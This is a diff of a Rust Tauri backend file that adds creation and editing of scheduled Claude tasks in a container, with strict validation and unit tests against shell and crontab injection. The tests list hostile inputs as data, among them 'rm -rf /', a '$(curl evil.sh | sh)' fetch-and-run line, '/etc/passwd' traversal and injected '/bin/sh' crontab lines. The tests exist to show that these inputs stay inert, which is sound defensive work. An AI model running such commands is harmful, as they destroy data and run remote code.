@@ -6,9 +6,9 @@
 //!   3. Scheduled tasks managed by the in-container `triple-c-scheduler`
 //!
 //! Everything here is read-only except the explicitly-mutating scheduler
-//! commands at the bottom of the file (enable/disable, run, remove, clear
-//! notifications), which shell out to the scheduler's own subcommands rather
-//! than editing its state files.
+//! commands at the bottom of the file (add/update, enable/disable, run, remove,
+//! clear notifications), which shell out to the scheduler's own subcommands
+//! rather than editing its state files.
 //!
 //! ## Container access
 //!
@@ -29,12 +29,25 @@
 //!
 //! * The `sh -c` scripts below are compile-time constants. No caller-supplied
 //!   value is ever interpolated into them.
-//! * Every command that takes a caller-supplied id runs as a plain **argv
+//! * Every command that takes a caller-supplied value runs as a plain **argv
 //!   vector** with no shell in the process tree at all, so shell metacharacters
 //!   are inert by construction. On top of that, ids are validated against a
 //!   strict allowlist ([`validate_task_id`], [`validate_session_id`]) that
 //!   admits no shell metacharacters, no `/`, no `.` (so no path traversal into
 //!   the scheduler's task dir), and no leading `-` (so no option injection).
+//!
+//! Creating a task ([`add_scheduled_task`]) is the one place where *arbitrary*
+//! user text — a task name, a whole Claude prompt — is handed to the container.
+//! It cannot be allowlisted, so it relies on the argv rule above plus
+//! [`ValidatedTaskInput`], which caps lengths, forbids control characters in
+//! single-line fields, and rejects a name that could be read as an option.
+//!
+//! The cron expression gets one extra guarantee. It is the only user-supplied
+//! value the scheduler writes into the *crontab* (`<schedule> <runner> <id>`),
+//! so a newline in it would be a crontab-injection primitive.
+//! [`validate_cron_expression`] therefore re-emits the five parsed fields
+//! joined by single spaces and only the normalised form is sent onward, so no
+//! whitespace the user typed can survive into a crontab line.
 //!
 //! ## Degradation
 //!
@@ -60,6 +73,17 @@ const MAX_SESSIONS: usize = 50;
 const MAX_NOTIFICATIONS: usize = 50;
 
 const CONTAINER_HOME: &str = "/home/claude";
+
+/// Caps on the free-text fields of a scheduled task. They exist to keep a
+/// runaway paste out of the container's task JSON and out of the `docker exec`
+/// payload; they are generous enough for a real prompt.
+const MAX_TASK_NAME_LEN: usize = 100;
+const MAX_TASK_PROMPT_LEN: usize = 8_000;
+const MAX_WORKING_DIR_LEN: usize = 512;
+const MAX_CRON_LEN: usize = 256;
+
+/// The scheduler's own default working directory (`cmd_add`).
+const DEFAULT_WORKING_DIR: &str = "/workspace";
 
 // ─────────────────────────────────────────────────────────────────────────────
 // Response models
@@ -768,11 +792,462 @@ pub async fn get_scheduler_notifications(
         .collect())
 }
 
+// ── Task creation: input validation ──────────────────────────────────────────
+
+/// Which of the scheduler's two mutually-exclusive schedule flags to use.
+///
+/// `triple-c-scheduler add` takes either `--schedule "<cron>"` (recurring) or
+/// `--at "YYYY-MM-DD HH:MM"` (one-shot) and errors if given both or neither.
+/// Modelling that as an enum makes the invalid combinations unrepresentable.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
+#[serde(rename_all = "camelCase")]
+pub enum ScheduleKind {
+    Recurring,
+    Once,
+}
+
+impl ScheduleKind {
+    fn flag(self) -> &'static str {
+        match self {
+            ScheduleKind::Recurring => "--schedule",
+            ScheduleKind::Once => "--at",
+        }
+    }
+}
+
+/// A task's fields after validation and normalisation. Constructing one is the
+/// only way to build the argv for `triple-c-scheduler add`.
+#[derive(Debug, Clone, PartialEq, Eq)]
+struct ValidatedTaskInput {
+    name: String,
+    prompt: String,
+    kind: ScheduleKind,
+    /// Normalised cron expression or `YYYY-MM-DD HH:MM` timestamp.
+    schedule: String,
+    working_dir: String,
+}
+
+impl ValidatedTaskInput {
+    /// The argv for `triple-c-scheduler add …`, one element per value.
+    ///
+    /// Note what is *not* here: no quoting, no escaping, no `sh -c`. Every
+    /// field is its own argv element, so quotes, `;`, `$(…)`, backticks and
+    /// newlines inside a prompt reach the scheduler as literal data.
+    fn add_args(&self) -> Vec<String> {
+        vec![
+            "add".to_string(),
+            "--name".to_string(),
+            self.name.clone(),
+            "--prompt".to_string(),
+            self.prompt.clone(),
+            self.kind.flag().to_string(),
+            self.schedule.clone(),
+            "--working-dir".to_string(),
+            self.working_dir.clone(),
+        ]
+    }
+}
+
+/// Reject control characters. Single-line fields admit none at all; the prompt
+/// is allowed tab/newline (a multi-line prompt is normal) but never a NUL,
+/// which cannot survive the exec API's C strings.
+fn reject_control_chars(value: &str, field: &str, allow_newlines: bool) -> Result<(), String> {
+    let offender = value.chars().find(|c| {
+        c.is_control() && !(allow_newlines && matches!(c, '\n' | '\r' | '\t'))
+    });
+    match offender {
+        Some(c) => Err(format!(
+            "{} cannot contain the control character {:?}.",
+            field, c
+        )),
+        None => Ok(()),
+    }
+}
+
+fn validate_task_name(name: &str) -> Result<String, String> {
+    let name = name.trim();
+    if name.is_empty() {
+        return Err("Task name is required.".to_string());
+    }
+    if name.chars().count() > MAX_TASK_NAME_LEN {
+        return Err(format!(
+            "Task name is too long (max {} characters).",
+            MAX_TASK_NAME_LEN
+        ));
+    }
+    reject_control_chars(name, "Task name", false)?;
+    // The scheduler assigns `--name`'s value positionally, so a leading dash is
+    // not exploitable today — but it would be the moment that parser changed,
+    // and a task called `--id` is a bad idea regardless.
+    if name.starts_with('-') {
+        return Err("Task name cannot start with “-”.".to_string());
+    }
+    Ok(name.to_string())
+}
+
+fn validate_task_prompt(prompt: &str) -> Result<String, String> {
+    let prompt = prompt.trim();
+    if prompt.is_empty() {
+        return Err("Task prompt is required.".to_string());
+    }
+    if prompt.chars().count() > MAX_TASK_PROMPT_LEN {
+        return Err(format!(
+            "Task prompt is too long (max {} characters).",
+            MAX_TASK_PROMPT_LEN
+        ));
+    }
+    reject_control_chars(prompt, "Task prompt", true)?;
+    Ok(prompt.to_string())
+}
+
+/// `None`/blank falls back to the scheduler's own default, `/workspace`.
+fn validate_working_dir(dir: Option<&str>) -> Result<String, String> {
+    let dir = dir.map(str::trim).filter(|d| !d.is_empty()).unwrap_or(DEFAULT_WORKING_DIR);
+    if dir.chars().count() > MAX_WORKING_DIR_LEN {
+        return Err(format!(
+            "Working directory is too long (max {} characters).",
+            MAX_WORKING_DIR_LEN
+        ));
+    }
+    reject_control_chars(dir, "Working directory", false)?;
+    if !dir.starts_with('/') {
+        return Err("Working directory must be an absolute path inside the container, e.g. /workspace.".to_string());
+    }
+    if dir.split('/').any(|segment| segment == "..") {
+        return Err("Working directory cannot contain “..”.".to_string());
+    }
+    Ok(dir.to_string())
+}
+
+/// One cron field's shape: its human name, its numeric bounds, and the
+/// three-letter aliases it accepts (`JAN…DEC`, `SUN…SAT`).
+struct CronField {
+    label: &'static str,
+    min: u32,
+    max: u32,
+    names: &'static [&'static str],
+    /// Numeric value of `names[0]` (1 for January, 0 for Sunday).
+    name_base: u32,
+}
+
+const MONTH_NAMES: [&str; 12] = [
+    "jan", "feb", "mar", "apr", "may", "jun", "jul", "aug", "sep", "oct", "nov", "dec",
+];
+const DOW_NAMES: [&str; 7] = ["sun", "mon", "tue", "wed", "thu", "fri", "sat"];
+
+/// Bounds match Debian/vixie cron, which is what the container runs: day of
+/// week accepts both 0 and 7 for Sunday, and month/day-of-week accept names.
+const CRON_FIELDS: [CronField; 5] = [
+    CronField { label: "minute", min: 0, max: 59, names: &[], name_base: 0 },
+    CronField { label: "hour", min: 0, max: 23, names: &[], name_base: 0 },
+    CronField { label: "day of month", min: 1, max: 31, names: &[], name_base: 0 },
+    CronField { label: "month", min: 1, max: 12, names: &MONTH_NAMES, name_base: 1 },
+    CronField { label: "day of week", min: 0, max: 7, names: &DOW_NAMES, name_base: 0 },
+];
+
+/// Largest `/step` accepted. Cron itself tolerates a step wider than the field
+/// (`*/61` is legal, it just means "once"), so this only fences off absurdity.
+const MAX_CRON_STEP: u32 = 1_000;
+
+fn cron_value(field: &CronField, token: &str) -> Result<u32, String> {
+    if !token.is_empty() && token.chars().all(|c| c.is_ascii_digit()) {
+        // `token` is all digits; a long run of them would overflow, so bound it
+        // before parsing rather than after.
+        let value = token
+            .parse::<u32>()
+            .map_err(|_| format!("{:?} is out of range for the {} field.", token, field.label))?;
+        if value < field.min || value > field.max {
+            return Err(format!(
+                "{:?} is out of range for the {} field ({}–{}).",
+                token, field.label, field.min, field.max
+            ));
+        }
+        return Ok(value);
+    }
+
+    let lowered = token.to_ascii_lowercase();
+    if let Some(index) = field.names.iter().position(|n| *n == lowered) {
+        return Ok(index as u32 + field.name_base);
+    }
+
+    Err(format!(
+        "{:?} is not valid in the {} field.",
+        token, field.label
+    ))
+}
+
+/// One comma-separated element of a cron field: `*`, `5`, `1-5`, `*/10`,
+/// `1-5/2`, or a name. A step is only legal after `*` or a range — vixie cron
+/// rejects `1/2`, so accepting it here would produce a crontab it refuses.
+fn validate_cron_element(field: &CronField, element: &str) -> Result<(), String> {
+    if element.is_empty() {
+        return Err(format!("Empty value in the {} field.", field.label));
+    }
+
+    let (base, step) = match element.split_once('/') {
+        Some((base, step)) => (base, Some(step)),
+        None => (element, None),
+    };
+
+    if let Some(step) = step {
+        if step.is_empty() || step.len() > 4 || !step.chars().all(|c| c.is_ascii_digit()) {
+            return Err(format!(
+                "{:?} in the {} field: a step must be a number, like */5.",
+                element, field.label
+            ));
+        }
+        let step: u32 = step.parse().unwrap_or(0);
+        if step == 0 || step > MAX_CRON_STEP {
+            return Err(format!(
+                "{:?} in the {} field: a step must be between 1 and {}.",
+                element, field.label, MAX_CRON_STEP
+            ));
+        }
+        if base != "*" && !base.contains('-') {
+            return Err(format!(
+                "{:?} in the {} field: a step can only follow * or a range, like */5 or 1-5/2.",
+                element, field.label
+            ));
+        }
+    }
+
+    if base == "*" {
+        return Ok(());
+    }
+    match base.split_once('-') {
+        Some((from, to)) => {
+            cron_value(field, from)?;
+            cron_value(field, to)?;
+        }
+        None => {
+            cron_value(field, base)?;
+        }
+    }
+    Ok(())
+}
+
+/// Validate a cron expression and return it normalised to exactly five fields
+/// separated by single spaces.
+///
+/// Two reasons this runs host-side instead of trusting the container:
+///
+/// 1. The scheduler does **not** validate the expression. It writes the task
+///    JSON, then rebuilds the whole crontab and pipes it to `crontab`, which
+///    rejects the *entire file* if any single line is malformed — and the
+///    rebuild swallows that error (`|| true`). One bad expression therefore
+///    silently unschedules every other task in the container. Verified against
+///    the real CLI.
+/// 2. The normalised return value is what gets sent onward, so no newline the
+///    user typed can reach a crontab line.
+fn validate_cron_expression(expression: &str) -> Result<String, String> {
+    if expression.len() > MAX_CRON_LEN {
+        return Err(format!(
+            "Cron expression is too long (max {} characters).",
+            MAX_CRON_LEN
+        ));
+    }
+    let fields: Vec<&str> = expression.split_whitespace().collect();
+    if fields.len() != 5 {
+        return Err(format!(
+            "A cron schedule needs exactly 5 fields (minute hour day-of-month month day-of-week); got {}.",
+            fields.len()
+        ));
+    }
+
+    for (spec, field) in CRON_FIELDS.iter().zip(fields.iter()) {
+        for element in field.split(',') {
+            validate_cron_element(spec, element)?;
+        }
+    }
+
+    Ok(fields.join(" "))
+}
+
+/// Validate the one-shot `--at` timestamp.
+///
+/// The scheduler matches `^[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}$` and
+/// converts it to a cron expression, so the shape is checked strictly here
+/// (chrono's `%m` would happily accept a one-digit month the scheduler will
+/// reject) and chrono is used only to reject impossible dates like `02-30`.
+fn validate_at_timestamp(at: &str) -> Result<String, String> {
+    let at = at.trim();
+    let well_formed = at.len() == 16
+        && at.as_bytes().iter().enumerate().all(|(i, b)| match i {
+            4 | 7 => *b == b'-',
+            10 => *b == b' ',
+            13 => *b == b':',
+            _ => b.is_ascii_digit(),
+        });
+    if !well_formed {
+        return Err(format!(
+            "One-shot time must look like \"YYYY-MM-DD HH:MM\"; got {:?}.",
+            at
+        ));
+    }
+    chrono::NaiveDateTime::parse_from_str(at, "%Y-%m-%d %H:%M")
+        .map_err(|_| format!("{:?} is not a real date and time.", at))?;
+    Ok(at.to_string())
+}
+
+fn validate_task_input(
+    name: &str,
+    prompt: &str,
+    kind: ScheduleKind,
+    schedule: &str,
+    working_dir: Option<&str>,
+) -> Result<ValidatedTaskInput, String> {
+    Ok(ValidatedTaskInput {
+        name: validate_task_name(name)?,
+        prompt: validate_task_prompt(prompt)?,
+        kind,
+        schedule: match kind {
+            ScheduleKind::Recurring => validate_cron_expression(schedule)?,
+            ScheduleKind::Once => validate_at_timestamp(schedule)?,
+        },
+        working_dir: validate_working_dir(working_dir)?,
+    })
+}
+
+/// Pull the new task's id out of `add`'s output block, which starts:
+///
+/// ```text
+/// Task created:
+///   ID:       a1b2c3d4
+///   Name:     …
+/// ```
+///
+/// The first `ID:` line wins (the echoed prompt comes later and could contain
+/// anything), and the result still has to pass [`validate_task_id`].
+fn parse_created_task_id(output: &str) -> Option<String> {
+    output
+        .lines()
+        .find_map(|line| line.trim().strip_prefix("ID:"))
+        .map(|value| value.trim().to_string())
+        .filter(|id| validate_task_id(id).is_ok())
+}
+
 // ── Mutating scheduler commands ──────────────────────────────────────────────
 //
 // These delegate to `triple-c-scheduler`'s own subcommands (which also rebuild
 // the crontab) instead of editing its JSON, and each runs as a bare argv vector
 // with a validated id.
+
+/// Create a task via the scheduler's `add`, returning the new task's id.
+#[tauri::command]
+pub async fn add_scheduled_task(
+    project_id: String,
+    name: String,
+    prompt: String,
+    schedule_kind: ScheduleKind,
+    schedule: String,
+    working_dir: Option<String>,
+    state: State<'_, AppState>,
+) -> Result<String, String> {
+    let input = validate_task_input(
+        &name,
+        &prompt,
+        schedule_kind,
+        &schedule,
+        working_dir.as_deref(),
+    )?;
+    let container_id = require_running_container(&project_id, &state).await?;
+
+    let output = run_scheduler(&container_id, input.add_args()).await?;
+    let task_id = parse_created_task_id(&output).ok_or_else(|| {
+        format!(
+            "The scheduler did not report a task id. Its output was: {}",
+            output.trim()
+        )
+    })?;
+
+    log::info!(
+        "Added scheduler task {} ({:?}) in project {}",
+        task_id,
+        input.name,
+        project_id
+    );
+    Ok(task_id)
+}
+
+/// Replace an existing task with an edited copy, returning the **new** task id.
+///
+/// `triple-c-scheduler` has no `edit`/`update` subcommand — its subcommands are
+/// add / remove / enable / disable / list / logs / run / notifications — and
+/// hand-editing its task JSON from here would bypass the crontab rebuild that
+/// every one of those does. So an edit is `add` followed by `remove`:
+///
+/// * **In that order**, so a rejected `add` leaves the original untouched
+///   rather than deleting a prompt the user cannot get back. The cost is a
+///   sub-second window in which both tasks are in the crontab.
+/// * The task therefore gets a **new id**. Its old log directory
+///   (`~/.claude/scheduler/logs/<old-id>/`) stays behind under the old id; the
+///   UI warns about this before saving.
+/// * `enabled` is carried over explicitly, because `add` always creates an
+///   enabled task and silently re-enabling a task the user had switched off
+///   would schedule a run they did not ask for.
+#[tauri::command]
+pub async fn update_scheduled_task(
+    project_id: String,
+    task_id: String,
+    name: String,
+    prompt: String,
+    schedule_kind: ScheduleKind,
+    schedule: String,
+    working_dir: Option<String>,
+    enabled: Option<bool>,
+    state: State<'_, AppState>,
+) -> Result<String, String> {
+    validate_task_id(&task_id)?;
+    let input = validate_task_input(
+        &name,
+        &prompt,
+        schedule_kind,
+        &schedule,
+        working_dir.as_deref(),
+    )?;
+    let container_id = require_running_container(&project_id, &state).await?;
+
+    let output = run_scheduler(&container_id, input.add_args()).await?;
+    let new_id = parse_created_task_id(&output).ok_or_else(|| {
+        format!(
+            "The scheduler did not report a task id, so the original task was left in place. Its output was: {}",
+            output.trim()
+        )
+    })?;
+
+    run_scheduler(
+        &container_id,
+        vec!["remove".to_string(), "--id".to_string(), task_id.clone()],
+    )
+    .await
+    .map_err(|e| {
+        format!(
+            "Saved the edited task as {}, but could not remove the original {}: {} — remove it by hand or both will run.",
+            new_id, task_id, e
+        )
+    })?;
+
+    if enabled == Some(false) {
+        if let Err(e) = run_scheduler(
+            &container_id,
+            vec!["disable".to_string(), "--id".to_string(), new_id.clone()],
+        )
+        .await
+        {
+            // The edit itself succeeded; the list refresh will show the task as
+            // enabled, which is visible rather than silent.
+            log::warn!("Could not re-disable edited task {}: {}", new_id, e);
+        }
+    }
+
+    log::info!(
+        "Updated scheduler task {} → {} in project {}",
+        task_id,
+        new_id,
+        project_id
+    );
+    Ok(new_id)
+}
 
 /// Enable or disable a task via the scheduler's `enable` / `disable`.
 #[tauri::command]
@@ -947,5 +1422,267 @@ mod tests {
     #[test]
     fn epoch_to_iso_is_rfc3339() {
         assert!(epoch_to_iso(0).starts_with("1970-01-01T00:00:00"));
+    }
+
+    // ── Task creation ────────────────────────────────────────────────────────
+
+    fn recurring(name: &str, prompt: &str) -> Result<ValidatedTaskInput, String> {
+        validate_task_input(name, prompt, ScheduleKind::Recurring, "*/30 * * * *", None)
+    }
+
+    /// The whole injection story: a prompt full of shell syntax is carried
+    /// through as one argv element, byte for byte, with nothing escaped or
+    /// stripped — because nothing downstream is a shell.
+    #[test]
+    fn shell_metacharacters_survive_as_one_argv_element() {
+        for hostile in [
+            "; rm -rf /",
+            "$(id)",
+            "`id`",
+            "$(curl evil.sh | sh)",
+            "x\"; rm -rf / #",
+            "x' ; rm -rf / ; '",
+            "line one\nline two\n; rm -rf /",
+            "a | b & c > d < e",
+            "${HOME}/../etc/passwd",
+            "%injected",
+        ] {
+            let input = recurring("nightly", hostile).expect("prompt is data, not syntax");
+            assert_eq!(input.prompt, hostile);
+
+            let args = input.add_args();
+            // Exactly one element equals the hostile string, and it is the one
+            // straight after `--prompt`.
+            let at = args.iter().position(|a| a == "--prompt").unwrap();
+            assert_eq!(args[at + 1], hostile, "prompt must be its own argv element");
+            assert_eq!(
+                args.iter().filter(|a| a.contains("rm -rf")).count(),
+                usize::from(hostile.contains("rm -rf")),
+                "no other argv element should have absorbed the payload"
+            );
+            // No shell ever appears in the command line we build.
+            assert!(!args.iter().any(|a| a == "sh" || a == "-c" || a == "bash"));
+        }
+    }
+
+    #[test]
+    fn add_args_are_flag_value_pairs_in_the_schedulers_own_spelling() {
+        let input = validate_task_input(
+            "nightly tests",
+            "Run the suite",
+            ScheduleKind::Recurring,
+            "0 3 * * *",
+            Some("/workspace/triple-c"),
+        )
+        .unwrap();
+        assert_eq!(
+            input.add_args(),
+            vec![
+                "add",
+                "--name",
+                "nightly tests",
+                "--prompt",
+                "Run the suite",
+                "--schedule",
+                "0 3 * * *",
+                "--working-dir",
+                "/workspace/triple-c",
+            ]
+        );
+
+        let once = validate_task_input(
+            "one shot",
+            "Commit",
+            ScheduleKind::Once,
+            "2026-12-25 09:05",
+            None,
+        )
+        .unwrap();
+        assert_eq!(
+            once.add_args()[5..],
+            ["--at", "2026-12-25 09:05", "--working-dir", "/workspace"]
+        );
+    }
+
+    #[test]
+    fn task_name_rejects_option_lookalikes_and_control_characters() {
+        assert!(validate_task_name("-id").is_err());
+        assert!(validate_task_name("--prompt").is_err());
+        assert!(validate_task_name("").is_err());
+        assert!(validate_task_name("   ").is_err());
+        assert!(validate_task_name("two\nlines").is_err());
+        assert!(validate_task_name("tab\there").is_err());
+        assert!(validate_task_name("nul\0byte").is_err());
+        assert!(validate_task_name(&"n".repeat(MAX_TASK_NAME_LEN + 1)).is_err());
+
+        // A name is free text otherwise; metacharacters are inert as argv.
+        assert_eq!(validate_task_name("  nightly; rm -rf /  ").unwrap(), "nightly; rm -rf /");
+        assert_eq!(validate_task_name("$(id)").unwrap(), "$(id)");
+        assert_eq!(validate_task_name(&"n".repeat(MAX_TASK_NAME_LEN)).unwrap().len(), MAX_TASK_NAME_LEN);
+    }
+
+    #[test]
+    fn task_prompt_allows_newlines_but_not_nul_or_novels() {
+        assert_eq!(
+            validate_task_prompt("first\nsecond\ttabbed").unwrap(),
+            "first\nsecond\ttabbed"
+        );
+        assert!(validate_task_prompt("").is_err());
+        assert!(validate_task_prompt("  \n ").is_err());
+        assert!(validate_task_prompt("bad\0nul").is_err());
+        assert!(validate_task_prompt(&"p".repeat(MAX_TASK_PROMPT_LEN + 1)).is_err());
+    }
+
+    #[test]
+    fn working_dir_must_be_absolute() {
+        assert_eq!(validate_working_dir(None).unwrap(), "/workspace");
+        assert_eq!(validate_working_dir(Some("  ")).unwrap(), "/workspace");
+        assert_eq!(validate_working_dir(Some("/workspace/app")).unwrap(), "/workspace/app");
+
+        for bad in [
+            "workspace",
+            "./workspace",
+            "~/workspace",
+            "-/workspace",
+            "/workspace/../etc",
+            "/work\nspace",
+            "/work\0space",
+        ] {
+            assert!(
+                validate_working_dir(Some(bad)).is_err(),
+                "should have rejected {:?}",
+                bad
+            );
+        }
+        assert!(validate_working_dir(Some(&format!("/{}", "d".repeat(MAX_WORKING_DIR_LEN)))).is_err());
+    }
+
+    #[test]
+    fn cron_accepts_real_expressions() {
+        for good in [
+            "* * * * *",
+            "*/30 * * * *",
+            "0 3 * * *",
+            "0 9 * * 1-5",
+            "0,30 9-17 * * 1-5",
+            "15 0 1 1 *",
+            "0 9 * * 0",
+            // vixie cron takes 7 as Sunday, and three-letter names.
+            "0 9 * * 7",
+            "0 9 * * MON-FRI",
+            "0 0 1 JAN *",
+            "0 0 1 jan sun",
+            // A step wider than the field is legal; it just means "once".
+            "0-59/70 * * * *",
+            "1-5/2 * * * *",
+            "05 09 * * *",
+        ] {
+            assert!(
+                validate_cron_expression(good).is_ok(),
+                "should have accepted {:?}: {:?}",
+                good,
+                validate_cron_expression(good)
+            );
+        }
+    }
+
+    #[test]
+    fn cron_rejects_what_crontab_would_reject() {
+        for bad in [
+            "",
+            "* * * *",          // four fields
+            "* * * * * *",      // six
+            "@daily",           // shorthand the scheduler cannot place in a line
+            "not a cron",
+            "99 * * * *",       // minute out of range
+            "0 24 * * *",       // hour out of range
+            "0 0 0 1 *",        // day-of-month is 1-based
+            "0 9 * * 8",        // day-of-week is 0-7
+            "0 9 * 13 *",       // month out of range
+            "*/0 * * * *",      // zero step
+            "1/2 * * * *",      // step without * or a range
+            "0 9 * * MON-FRO",  // not a weekday
+            "0 9 * * mon,",     // empty list element
+            "0 9 * * ,mon",
+            "0 9 * * 1--5",
+            "0 9 * * 1-5/",     // empty step
+            "0 9 * * 1-5/x",
+            // Names only apply to their own field: no month in day-of-week,
+            // and no names at all in minute/hour/day-of-month.
+            "0 9 * * jan",
+            "jan 9 * * *",
+            "0 mon * * *",
+            "0 9 * * *; rm -rf /",
+            "$(id) * * * *",
+            "0 9 * * *`id`",
+            "99999999999999999999 * * * *",
+        ] {
+            assert!(
+                validate_cron_expression(bad).is_err(),
+                "should have rejected {:?}",
+                bad
+            );
+        }
+        assert!(validate_cron_expression(&"1 ".repeat(200)).is_err());
+    }
+
+    /// The crontab line is `<schedule> <runner> <id>`, so any whitespace the
+    /// user typed has to be flattened before it can start a second line.
+    #[test]
+    fn cron_normalisation_flattens_whitespace_and_newlines() {
+        assert_eq!(
+            validate_cron_expression("  0   9  *  *  *  ").unwrap(),
+            "0 9 * * *"
+        );
+        assert_eq!(
+            validate_cron_expression("0 9 * *\n*").unwrap(),
+            "0 9 * * *"
+        );
+        assert_eq!(validate_cron_expression("0\t9\t*\t*\t*").unwrap(), "0 9 * * *");
+        // An injected extra line is extra fields, and five is five.
+        assert!(validate_cron_expression("* * * * *\n* * * * * /bin/sh").is_err());
+
+        let input =
+            validate_task_input("n", "p", ScheduleKind::Recurring, "0 9 * *\n*", None).unwrap();
+        assert!(!input.schedule.contains('\n'));
+        assert_eq!(input.schedule, "0 9 * * *");
+    }
+
+    #[test]
+    fn at_timestamp_matches_the_schedulers_own_format() {
+        assert_eq!(
+            validate_at_timestamp("  2026-12-25 09:05  ").unwrap(),
+            "2026-12-25 09:05"
+        );
+        for bad in [
+            "",
+            "tomorrow",
+            "2026-1-5 09:05",       // the scheduler's regex demands two digits
+            "2026-12-25T09:05",
+            "2026-12-25 09:05:00",
+            "2026-13-01 09:05",
+            "2026-02-30 09:05",     // not a real day
+            "2026-12-25 25:00",
+            "2026-12-25 09:05\n* * * * * /bin/sh",
+            "$(date) 09:05",
+        ] {
+            assert!(
+                validate_at_timestamp(bad).is_err(),
+                "should have rejected {:?}",
+                bad
+            );
+        }
+    }
+
+    #[test]
+    fn created_task_id_comes_from_the_first_id_line_and_is_revalidated() {
+        let output = "Task created:\n  ID:       5c2fa70d\n  Name:     nightly\n  Type:     recurring\n  Schedule: */30 * * * *\n  Prompt:   ID: not-this-one\n";
+        assert_eq!(parse_created_task_id(output).as_deref(), Some("5c2fa70d"));
+
+        assert_eq!(parse_created_task_id("").as_deref(), None);
+        assert_eq!(parse_created_task_id("Task created:\n").as_deref(), None);
+        // A malformed id is dropped rather than passed to a later subcommand.
+        assert_eq!(parse_created_task_id("  ID:  ../../etc/passwd\n").as_deref(), None);
+        assert_eq!(parse_created_task_id("  ID:  a; rm -rf /\n").as_deref(), None);
     }
 }
